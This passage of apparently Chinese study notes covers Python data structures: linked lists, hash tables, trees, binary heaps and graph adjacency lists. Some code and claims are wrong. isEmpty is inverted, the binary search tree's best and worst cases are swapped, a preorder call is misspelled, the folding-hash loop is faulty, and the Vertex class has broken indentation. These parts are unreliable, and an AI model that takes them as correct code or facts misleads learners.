n.getNext() != <span class="literal">None</span>:</span><br><span class="line">                res.append(n.getData())</span><br><span class="line">                n = n.getNext()</span><br><span class="line">            res.append(n.getData())</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">count</span>(<span class="params">self</span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        n = self.getNext()</span><br><span class="line">        <span class="keyword">if</span> n != <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">while</span> n != <span class="literal">None</span>:</span><br><span class="line">                res += <span class="number">1</span></span><br><span class="line">                n = n.getNext()</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">reverse</span>(<span class="params">self,head</span>):</span><br><span class="line">        prev = <span class="literal">None</span></span><br><span class="line">        curr = head</span><br><span class="line">        <span class="keyword">while</span> curr:</span><br><span class="line">            next_node = curr.<span class="built_in">next</span></span><br><span class="line">            curr.<span class="built_in">next</span> = prev</span><br><span class="line">            prev = curr</span><br><span class="line">            curr = next_node</span><br><span class="line">        <span class="keyword">return</span> prev</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">self,location:<span class="built_in">int</span></span>)-&gt;Node:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">self,item:<span class="built_in">any</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="2-有序表"><a href="#2-有序表" class="headerlink" title="2 有序表"></a>2 有序表</h3><blockquote><p>定义：按大小顺序排好的链表。</p></blockquote><hr><h2 id="五、散列"><a href="#五、散列" class="headerlink" title="五、散列"></a>五、散列</h2><h3 id="1-哈希表"><a href="#1-哈希表" class="headerlink" title="1 哈希表"></a>1 哈希表</h3><blockquote><p>事先确定了数据的位置，查找的时间为：O(1)</p><p>def hash( num )：计算哈希值。（一般是求余）</p><p>hash_lst对应余数值，查找时计算余数值后在 hash_lst 中寻找是否有该数值。</p></blockquote><ul><li><p>完美散列函数</p><blockquote><p>每一个数据项都映射到不同的槽中。</p></blockquote></li><li><p>好的散列函数</p><ul><li>冲突少（近似完美）</li><li>计算难度低（额外开销小）</li><li>充分分散数据项（节约空间）</li></ul></li><li><p>作为一致性校验的数据“指纹”函数需要具备如下的特性</p><ul><li>压缩性：任意长度的数据，得到的“指纹”长度是固定的。</li><li>易计算性：从原数据计算“指纹”很容易。（从指纹计算原数据是不可能的）</li><li>抗修改性：对原数据的微小变动，都会引起“指纹”的大改变。</li><li>抗冲突性：已知原数据和“指纹”，要找到相同指纹的数据（伪造）是非常困难的。</li></ul></li><li><p>案例：md5（128位），SHA-0/SHA-1（160位（20 Bytes）），SHA-256，SHA-224，SHA-512，SHA-384</p></li><li>应用：密码，网盘（先上传散列值，比较服务器中有无该资源，有则存链接，无则上传文件）</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python中自带的加密</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">m = hashlib.md5()</span><br><span class="line">m.update(<span class="string">&quot;password&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)) <span class="comment"># 更新m中的字符串</span></span><br><span class="line">pw = m.hexdigest()</span><br><span class="line"><span class="built_in">print</span>(pw)</span><br><span class="line"><span class="built_in">print</span>(hashlib.md5((<span class="string">&quot;Hello World!&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))).hexdigest())</span><br></pre></td></tr></table></figure><h3 id="2-折叠法"><a href="#2-折叠法" class="headerlink" title="2 折叠法"></a>2 折叠法</h3><blockquote><p>将数据项按照位数分为若干段，再将几段数字相加，最后对散列表大小求余。</p><p>隔数反转：隔一个数将数字进行反转。（属于一种微调手段，以便更好符合散列特效）</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&quot;12312311231&quot;</span></span><br><span class="line">h = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s))]</span><br><span class="line">gap = <span class="number">2</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s),gap):</span><br><span class="line">    i = <span class="built_in">int</span>(s[i:i+gap-<span class="number">1</span>])</span><br><span class="line">    count += i</span><br><span class="line">h[count % <span class="built_in">len</span>(s)] = s</span><br><span class="line"><span class="built_in">print</span>(h)</span><br></pre></td></tr></table></figure><h3 id="3-平方取中法"><a href="#3-平方取中法" class="headerlink" title="3 平方取中法"></a>3 平方取中法</h3><blockquote><p>先对数进行平方，再取平方数中间两位，最后对散列表大小求余。</p></blockquote><h3 id="4-设计注意"><a href="#4-设计注意" class="headerlink" title="4 设计注意"></a>4 设计注意</h3><blockquote><p>变位词：字母一样，顺序不同。为了防止可以将字符所在位置设为权重相乘。</p></blockquote><h3 id="5-冲突解决"><a href="#5-冲突解决" class="headerlink" title="5 冲突解决"></a>5 冲突解决</h3><ol><li><p>开放定址（open addressing）</p><blockquote><p>在冲突的数据项处重新再逐个向后找一个空槽。该方法叫线性探测（linear probing）。</p></blockquote><ul><li>缺点：有聚集的趋势。</li><li>改进：逐个向后找改为跳跃式探测，例如一次+3。（尽量将散列表大小设为素数，防止周期）</li><li>改进：不再固定为一个值，而是逐步增加，例：+1 , +3 , +5 , +7 …</li></ul></li><li><p>数据项链（Chaining）</p><blockquote><p>将槽扩展为数据项集合。（散列 + 排序查找）</p></blockquote></li></ol><h3 id="6-ADT-Map"><a href="#6-ADT-Map" class="headerlink" title="6 ADT Map"></a>6 ADT Map</h3><blockquote><p>dict：映射Map。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">HashTable</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,size:<span class="built_in">int</span></span>):</span><br><span class="line">        self.size = size</span><br><span class="line">        self.slots = [<span class="literal">None</span>] * self.size <span class="comment"># 保存key</span></span><br><span class="line">        self.data = [<span class="literal">None</span>] * self.size <span class="comment"># 保存data</span></span><br><span class="line">    <span class="comment"># hash函数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hashfunction</span>(<span class="params">self,key:<span class="built_in">any</span></span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> key % self.size</span><br><span class="line">    <span class="comment"># 再hash函数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rehash</span>(<span class="params">self,oldhash:<span class="built_in">int</span></span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> (oldhash + <span class="number">1</span>) % self.size</span><br><span class="line">    <span class="comment"># 存key-val</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">put</span>(<span class="params">self,key:<span class="built_in">any</span>,data:<span class="built_in">any</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        hashvalue = self.hashfunction(key)</span><br><span class="line">        <span class="keyword">if</span> self.slots[hashvalue] == <span class="literal">None</span>:</span><br><span class="line">            self.slots[hashvalue] = key</span><br><span class="line">            self.data[hashvalue] = data</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> self.slots[hashvalue] == key:</span><br><span class="line">                self.data[hashvalue] = data</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                nextslot = self.rehash(hashvalue)</span><br><span class="line">                <span class="keyword">while</span> self.slots[nextslot] != <span class="literal">None</span> <span class="keyword">and</span> self.slots[nextslot] != key:</span><br><span class="line">                    nextslot = self.rehash(nextslot)</span><br><span class="line">                <span class="keyword">if</span> self.slots[nextslot] == <span class="literal">None</span>:</span><br><span class="line">                    self.slots[nextslot] = key</span><br><span class="line">                    self.data[nextslot] = data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.data[nextslot] = data</span><br><span class="line">    <span class="comment"># key获得data</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self,key:<span class="built_in">any</span></span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        startslot = self.hashfunction(key)</span><br><span class="line">        data = <span class="literal">None</span></span><br><span class="line">        stop = <span class="literal">False</span></span><br><span class="line">        found = <span class="literal">False</span></span><br><span class="line">        position = startslot</span><br><span class="line">        <span class="keyword">while</span> self.slots[position] != <span class="literal">None</span> <span class="keyword">and</span> <span class="keyword">not</span> found <span class="keyword">and</span> <span class="keyword">not</span> stop:</span><br><span class="line">            <span class="keyword">if</span> self.slots[position] == key:</span><br><span class="line">                found = <span class="literal">True</span></span><br><span class="line">                data = self.data[position]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                position = self.rehash(position)</span><br><span class="line">                <span class="keyword">if</span> position == startslot:</span><br><span class="line">                    stop = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="comment"># 索引查找</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, key</span>):</span><br><span class="line">        <span class="keyword">return</span> self.get(key)</span><br><span class="line">    <span class="comment"># 索引设置</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setitem__</span>(<span class="params">self, key, data</span>):</span><br><span class="line">        self.put(key,data)</span><br></pre></td></tr></table></figure><hr><h2 id="六、树"><a href="#六、树" class="headerlink" title="六、树"></a>六、树</h2><h3 id="1-术语"><a href="#1-术语" class="headerlink" title="1 术语"></a>1 术语</h3><blockquote><p>基本同C语言。</p></blockquote><div class="table-container"><table><thead><tr><th>名称</th><th>意义</th></tr></thead><tbody><tr><td>入边</td><td>进入该节点的边</td></tr><tr><td>出边</td><td>离开该节点的边</td></tr></tbody></table></div><h3 id="2-列表嵌套法"><a href="#2-列表嵌套法" class="headerlink" title="2 列表嵌套法"></a>2 列表嵌套法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 二叉树</span></span><br><span class="line">myTree = [root,left,right]</span><br><span class="line"><span class="comment"># 多叉树</span></span><br><span class="line">myTree = [root,first,second,third,...]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myTree</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,r:<span class="built_in">any</span></span>):</span><br><span class="line">        self.BinaryTree = [r,[],[]]</span><br><span class="line">    <span class="comment"># 左子树插入</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">insertLeft</span>(<span class="params">self,root,newBrance</span>):</span><br><span class="line">        t = root.pop(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(t) &gt; <span class="number">1</span>:</span><br><span class="line">            root.insert(<span class="number">1</span>,[newBrance,t,[]])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            root.insert(<span class="number">1</span>,[newBrance,[],[]])</span><br><span class="line">        <span class="keyword">return</span> root</span><br><span class="line">    <span class="comment"># 右子树插入</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">insertRight</span>(<span class="params">self,root,newBrance</span>):</span><br><span class="line">        t = root.pop(<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(t) &gt; <span class="number">1</span>:</span><br><span class="line">            root.insert(<span class="number">2</span>,[newBrance,t,[]])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            root.insert(<span class="number">2</span>,[newBrance,[],[]])</span><br><span class="line">        <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure><h3 id="3-节点链接法"><a href="#3-节点链接法" class="headerlink" title="3 节点链接法"></a>3 节点链接法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryTree</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,rootObj</span>):</span><br><span class="line">        self.key = rootObj</span><br><span class="line">        self.leftChild = <span class="literal">None</span></span><br><span class="line">        self.rightChild = <span class="literal">None</span></span><br><span class="line">    <span class="comment"># 左插入</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">insertLeft</span>(<span class="params">self,newNode</span>):</span><br><span class="line">        <span class="keyword">if</span> self.leftChild == <span class="literal">None</span>:</span><br><span class="line">            self.leftChild = BinaryTree(newNode)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            t = BinaryTree(newNode)</span><br><span class="line">            t.leftChild = self.leftChild</span><br><span class="line">            self.leftChild = t</span><br><span class="line">    <span class="comment"># 右插入</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">insertRight</span>(<span class="params">self,newNode</span>):</span><br><span class="line">        <span class="keyword">if</span> self.rightChild == <span class="literal">None</span>:</span><br><span class="line">            self.rightChild = BinaryTree(newNode)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            t = BinaryTree(newNode)</span><br><span class="line">            t.rightChild = self.rightChild</span><br><span class="line">            self.rightChild = t</span><br></pre></td></tr></table></figure><h3 id="4-表达式树"><a href="#4-表达式树" class="headerlink" title="4 表达式树"></a>4 表达式树</h3><blockquote><p><a href="https://github.com/Magialeaf/Course/blob/main/Data_Structure/表达式树.py">my::表达式树</a>  </p><p>求表达式值</p><p>例：$((5+((3+7)<em>(4-1)))+(4</em>5))$</p><p>思路：碰到左括号左下降，碰到数字记录后回升，碰到操作数记录后右下降，碰到右括号回升，留一个栈记录父节点。</p></blockquote><h3 id="5-树的遍历"><a href="#5-树的遍历" class="headerlink" title="5 树的遍历"></a>5 树的遍历</h3><ul><li><p>前序遍历（preorder）：NLR</p><blockquote><p>先根再递归前序访问左子树，最后前序访问右子树。</p></blockquote></li><li><p>中序遍历（inorder）：LNR</p><blockquote><p>先递归地中序访问左子树，再访问根，最后中序访问右子树。</p></blockquote></li><li><p>后序遍历（postorder）：LRN</p><blockquote><p>先递归地后序访问左子树，再后序访问右子树，最后访问根。</p></blockquote></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TreeOrder</span>:</span><br><span class="line"><span class="comment"># 前序</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">preorder</span>(<span class="params">self,tree:BinaryTree</span>):</span><br><span class="line">        <span class="keyword">if</span> tree:</span><br><span class="line">            <span class="built_in">print</span>(tree.getRootVal())</span><br><span class="line">            self.preorder(tree.getLeftChild())</span><br><span class="line">            self.preorder(tree.getRightChild())</span><br><span class="line"><span class="comment"># 中序</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inorder</span>(<span class="params">self,tree:BinaryTree</span>):</span><br><span class="line">        <span class="keyword">if</span> tree:</span><br><span class="line">            self.inorder(tree.getLeftChild())</span><br><span class="line">            <span class="built_in">print</span>(tree.getRootVal())</span><br><span class="line">            self.inorder(tree.getRightChild())</span><br><span class="line"><span class="comment"># 后序</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">postorder</span>(<span class="params">self,tree:BinaryTree</span>):</span><br><span class="line">        <span class="keyword">if</span> tree:</span><br><span class="line">            self.postorder(tree.getLeftChild())</span><br><span class="line">            self.postorder(tree.getRightChild())</span><br><span class="line">            <span class="built_in">print</span>(tree.getRootVal())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 另一种表示</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">preorder</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.key)</span><br><span class="line">        <span class="keyword">if</span> self.leftChild:</span><br><span class="line">            self.leftChild.preoder()</span><br><span class="line">        <span class="keyword">if</span> self.rightChild:</span><br><span class="line">            self.rightChild.preorder()</span><br></pre></td></tr></table></figure><h3 id="6-二叉堆实现优先队列"><a href="#6-二叉堆实现优先队列" class="headerlink" title="6 二叉堆实现优先队列"></a>6 二叉堆实现优先队列</h3><blockquote><p><a href="https://github.com/Magialeaf/Course/blob/main/Data_Structure/6_5.二叉堆.py">my::二叉堆</a></p><p>最小 key 排在队首称为最小堆（min heap），反之是最大堆。（max heap）</p><p>实现：完全二叉树。</p><p>堆次序：任何一个节点 x ，其父节点 p 中的 key 均小于 x 中的 key。</p><p>时间：<script type="math/tex">O(log n)</script></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryHeap</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.heapList = [<span class="number">0</span>]</span><br><span class="line">        self.currentSize = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 上浮</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">percUp</span>(<span class="params">self, i:<span class="built_in">int</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">while</span> i // <span class="number">2</span> &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> self.heapList[i] &lt; self.heapList[i // <span class="number">2</span>]:</span><br><span class="line">                self.heapList[i],self.heapList[i // <span class="number">2</span>] = self.heapList[i // <span class="number">2</span>],self.heapList[i]</span><br><span class="line">            i //= <span class="number">2</span></span><br><span class="line">    <span class="comment"># 下沉</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">percDown</span>(<span class="params">self,i:<span class="built_in">int</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">while</span> i * <span class="number">2</span> &lt;= self.currentSize:</span><br><span class="line">            mc = self.minChild(i)</span><br><span class="line">            <span class="keyword">if</span> self.heapList[i] &gt; self.heapList[mc]:</span><br><span class="line">                self.heapList[i],self.heapList[mc] = self.heapList[mc],self.heapList[i]</span><br><span class="line">            i = mc</span><br><span class="line">    <span class="comment"># 最小子孩子</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minChild</span>(<span class="params">self,i:<span class="built_in">int</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> i * <span class="number">2</span> + <span class="number">1</span> &gt; self.currentSize:</span><br><span class="line">            <span class="keyword">return</span> i * <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> self.heapList[i * <span class="number">2</span>] &lt; self.heapList[i * <span class="number">2</span> + <span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">return</span> i * <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> i * <span class="number">2</span> + <span class="number">1</span></span><br><span class="line">    <span class="comment"># 插入后上浮保持有序</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">insert</span>(<span class="params">self,key:<span class="built_in">any</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        self.heapList.append(key)</span><br><span class="line">        self.currentSize += <span class="number">1</span></span><br><span class="line">        self.percUp(self.currentSize)</span><br><span class="line">    <span class="comment"># 插入后尾节点替换主根，然后下沉保持有序</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findMin</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">if</span> self.size() &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> self.heapList[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">delMin</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        retval = self.heapList[<span class="number">1</span>]</span><br><span class="line">        self.heapList[<span class="number">1</span>] = self.heapList[self.currentSize]</span><br><span class="line">        self.currentSize -= <span class="number">1</span></span><br><span class="line">        self.heapList.pop()</span><br><span class="line">        self.percDown(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> retval</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isEmpty</span>(<span class="params">self</span>)-&gt;<span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">return</span> self.currentSize &gt; <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">size</span>(<span class="params">self</span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> self.currentSize</span><br><span class="line">    <span class="comment"># 下沉法控制时间是O(n)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">buildHeap</span>(<span class="params">self,lst:<span class="built_in">list</span></span>):</span><br><span class="line">        i = <span class="built_in">len</span>(lst) // <span class="number">2</span></span><br><span class="line">        self.currentSize = <span class="built_in">len</span>(lst)</span><br><span class="line">        self.heapList = [<span class="number">0</span>] + lst[:]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">len</span>(self.heapList),i)</span><br><span class="line">        <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(self.heapList,i)</span><br><span class="line">            self.percDown(i)</span><br><span class="line">            i -= <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(self.heapList,i)</span><br></pre></td></tr></table></figure><h3 id="7-二叉查找树"><a href="#7-二叉查找树" class="headerlink" title="7 二叉查找树"></a>7 二叉查找树</h3><blockquote><p>实现：有序表数据结构 + 二分搜索  ||  散列表数据结构 + 散列及冲突解决</p><p>性质：比父节点小的 key 都出现在左子树，比父节点大的 key 都出现在右子树。</p><p>普通二叉查找树最坏：O( log n )，最好：O( n )（单链表），插入时受数据顺序影响，最终会形成不同的二叉查找树。    </p><p><a href="https://github.com/Magialeaf/Course/blob/main/Data_Structure/6_6.二叉查找树.py">my::二叉查找树</a></p></blockquote><h3 id="8-AVL树"><a href="#8-AVL树" class="headerlink" title="8 AVL树"></a>8 AVL树</h3><blockquote><p>平衡二叉查找树。</p><p>平衡因子：高度差，大于0左重，小于0右重，若每个节点平衡因子都在 [-1,0,1] 之中则成为平衡树。</p><p>时间：O( log n )（类似斐波那契数列）</p></blockquote><h3 id="9-B树和B-树"><a href="#9-B树和B-树" class="headerlink" title="9 B树和B+树"></a>9 B树和B+树</h3><blockquote><p>m阶B树：多叉查找树。树中每个结点至多有m个孩子结点（即至多有m-1个关键字）</p><p>B树结构如下：[n,p0,k1,p1,k2, … , kn,pn]</p><ul><li>n：结点的关键字个数</li><li>p：指针，指向孩子结点</li><li>k：关键字，通过关键字来判断孩子的位置。</li></ul></blockquote><h3 id="10-红黑树"><a href="#10-红黑树" class="headerlink" title="10 红黑树"></a>10 红黑树</h3><blockquote></blockquote><h3 id="11-多路归并树"><a href="#11-多路归并树" class="headerlink" title="11 多路归并树"></a>11 多路归并树</h3><blockquote></blockquote><h3 id="12-败者树"><a href="#12-败者树" class="headerlink" title="12 败者树"></a>12 败者树</h3><blockquote></blockquote><hr><h2 id="七、图（Graph）"><a href="#七、图（Graph）" class="headerlink" title="七、图（Graph）"></a>七、图（Graph）</h2><h3 id="1-术语-1"><a href="#1-术语-1" class="headerlink" title="1 术语"></a>1 术语</h3><blockquote><p>若有向图中不存在任何圈，则称作 “ 有向无圈图 directed acyclic graph：DAG “（树是一种DAG，该问题更简单）</p></blockquote><div class="table-container"><table><thead><tr><th>名称</th><th>意义</th></tr></thead><tbody><tr><td>顶点Vertex（节点Node）</td><td>图的基本组成部分，顶点具有名称标识Key，也可以携带数据项payload</td></tr><tr><td>边Edge（弧Arc）</td><td>边连接两个顶点，可以有向或者无向</td></tr><tr><td>权重Weight</td><td>从一个顶点到另一个顶点的代价</td></tr><tr><td>路径Path</td><td>由边依次连接起来的顶点序列。无权路径的长度为边的数量，带权是权重和</td></tr><tr><td>圈Cycle</td><td>首尾顶点相同的路径</td></tr><tr><td>V</td><td>顶点集合</td></tr><tr><td>E</td><td>边集合</td></tr><tr><td>e=( v , w )</td><td>E中每条边 e=( v , w )，v 和 w 都是V中顶点</td></tr><tr><td>子图</td><td>V 和 E 的子集</td></tr></tbody></table></div><h3 id="2-邻接矩阵"><a href="#2-邻接矩阵" class="headerlink" title="2 邻接矩阵"></a>2 邻接矩阵</h3><blockquote><p>优点：简单，容易得到顶点如何连接。</p><p>缺点：边数少会变成稀疏矩阵。</p></blockquote><p><img src="/posts/4b0178e0/领接矩阵.jpg" alt></p><h3 id="3-邻接表"><a href="#3-邻接表" class="headerlink" title="3 邻接表"></a>3 邻接表</h3><blockquote><p> <a href="https://github.com/Magialeaf/Course/blob/main/Data_Structure/7_1.ADT Graph.py">my::邻接表 </a></p><p>维护一个包含所有顶点的主列表(master list)，主列表中的每个顶点再关联一个与自身有边连接的所有顶点的列表。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Vertex</span>:</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key: <span class="built_in">any</span></span>):</span><br><span class="line">        self.<span class="built_in">id</span> = key</span><br><span class="line">        self.connectedTo = &#123;&#125;</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addNeighbor</span>(<span class="params">self, nbr:<span class="built_in">object</span>, weight=<span class="number">0</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.connectedTo[nbr] = weight</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;[&#123;0&#125;]&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(self.<span class="built_in">id</span>)) + <span class="string">&#x27;&lt;-&gt;&#x27;</span> + <span class="built_in">str</span>([x.<span class="built_in">id</span> <span class="keyword">for</span> x <span class="keyword">in</span> self.connectedTo])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getConnections</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> self.connectedTo.keys()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getId</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> self.<span class="built_in">id</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getWeight</span>(<span class="params">self,nbr:<span class="built_in">any</span></span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> self.connectedTo[nbr]</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Graph</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.vertList = &#123;&#125;</span><br><span class="line">        self.numVertices = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addVertex</span>(<span class="params">self,key:<span class="built_in">any</span></span>)-&gt;Vertex:</span><br><span class="line">        self.numVertices += <span class="number">1</span></span><br><span class="line">        newVertex = Vertex(key)</span><br><span class="line">        self.vertList[key] = newVertex</span><br><span class="line">        <span class="keyword">return</span> newVertex</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getVertex</span>(<span class="params">self,vKey:<span class="built_in">any</span></span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">if</span> vKey <span class="keyword">in</span> self.vertList:</span><br><span class="line">            <span class="keyword">return</span> self.vertList[vKey]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__contains__</span>(<span class="params">self, vKey:<span class="built_in">any</span></span>)-&gt;<span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">return</span> vKey <span class="keyword">in</span> self.vertList</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addEdge</span>(<span class="params">self,fromVert:<span class="built_in">any</span>,toVert:<span class="built_in">any</span>,weight:<span class="built_in">any</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> fromVert <span class="keyword">not</span> <span class="keyword">in</span> self.vertList:</span><br><span class="line">            newVertex = self.addVertex(fromVert)</span><br><span class="line">        <span class="keyword">if</span> toVert <span class="keyword">not</span> <span class="keyword">in</span> self.vertList:</span><br><span class="line">            newVertex = self.addVertex(toVert)</span><br><span class="line">        self.vertList[fromVert].addNeighbor(self.vertList[toVert],weight)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Vertices</span>(<span class="params">self</span>)-&gt;<span class="built_in">list</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">list</span>(self.vertList.keys())</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>)-&gt;<span class="built_in">iter</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">iter</span>(self.vertList.values())</span><br></pre></td></tr></table></figure><h3 id="4-骑士周游问题"><a href="#4-骑士周游问题" class="headerlink" title="4 骑士周游问题"></a>4 骑士周游问题</h3><blockquote><p>哈密顿通路(回路)与哈密顿图 (Hamilton图) 通过图G的每个结点一次，且仅一次的通路(回路)，就是哈密顿通路(回路). 存在<a href="https://baike.so.com/doc/6532070-6745806.html">哈密顿回路</a>的图就是哈密顿图。</p><p>利用深度优先：O（k ** N）（N是棋盘格数）</p><p>改进：启发式规则：预先知道下一步的格子中的选择有多少种，优先选择下一个格子的选择少的那个格子。</p></blockquote><h3 id="5-拓扑排序"><a href="#5-拓扑排序" class="headerlink" 